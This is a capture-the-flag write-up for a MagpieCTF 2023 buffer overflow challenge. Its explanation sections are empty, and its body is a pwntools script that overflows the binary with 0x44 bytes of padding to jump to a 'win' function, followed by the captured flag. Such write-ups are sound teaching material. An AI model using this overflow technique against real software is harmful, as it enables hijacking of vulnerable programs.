# This outta be large enough right?

## Challenge

## Solution

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('chall')

host = args.HOST or 'srv1.2023.magpiectf.ca'
port = int(args.PORT or 6201)

io = connect(host, port)

io.sendline(flat({0x44: exe.sym['win']}))

io.interactive()
```

## Flag

```
magpie{0mn1_fl4g_3v3rywh3r3}
```
